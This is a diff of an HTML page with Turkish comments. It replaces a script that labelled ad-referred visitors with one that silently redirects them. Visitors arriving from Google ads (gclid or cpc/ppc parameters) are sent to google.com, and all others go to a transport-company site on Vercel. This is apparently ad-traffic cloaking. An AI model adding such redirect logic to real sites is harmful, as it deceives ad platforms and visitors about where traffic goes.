@@ -408,47 +408,30 @@
   </style>
 </head>
 <body>
- 
-  <h1 id="mesaj"></h1>
+ <script>
+(function() {
 
-  <script>
-    // URL query parametrelerini okumak için yardımcı fonksiyon
-    function getQueryParams() {
-      const params = {};
-      const queryString = window.location.search.substring(1);
-      if (!queryString) return params;
+    // URL parametrelerini al
+    const urlParams = new URLSearchParams(window.location.search);
 
-      queryString.split("&").forEach(function (pair) {
-        const [key, value] = pair.split("=");
-        if (key) params[decodeURIComponent(key)] = decodeURIComponent(value || "");
-      });
-      return params;
+    // Google Ads tespiti için kriterler (gclid en önemli)
+    const isGoogleAds = (
+        urlParams.has("gclid") || 
+        (urlParams.get("utm_source") && urlParams.get("utm_source").toLowerCase() === "google") ||
+        (urlParams.get("utm_medium") && ["cpc", "ppc"].includes(urlParams.get("utm_medium").toLowerCase()))
+    );
+
+    if (isGoogleAds) {
+        // Kullanıcı Google Ads’den geliyorsa → TÜM PARAMETRELERLE Google.com’a yönlendir
+        const queryString = window.location.search; // tüm parametreleri bozmadan al
+        window.location.href = "https://google.com" + queryString;
+    } else {
+        // Normal giriş → nakliye-lac.vercel.app aç
+        window.location.href = "https://nakliye-lac.vercel.app/";
     }
 
-    const ua = navigator.userAgent.toLowerCase();
-    const ref = document.referrer.toLowerCase();
-    const params = getQueryParams();
-
-    let mesaj = "normal giriş"; // varsayılan
-
-    // 1) Google botları
-    if (ua.includes("googlebot")) {
-      mesaj = "normal giriş";
-    } 
-    // 2) Google Reklamı: gclid veya utm_medium=cpc varsa reklam say
-    else if (
-      typeof params["gclid"] !== "undefined" ||
-      (params["utm_medium"] && params["utm_medium"].toLowerCase() === "cpc")
-    ) {
-      mesaj = "reklamlardan geldiniz";
-    } 
-    // 3) Diğer tüm durumlar: normal giriş (doğrudan, organik vs.)
-    else {
-      mesaj = "normal giriş";
-    }
-
-    document.getElementById("mesaj").textContent = mesaj;
-  </script>
+})();
+</script>
 
 
 
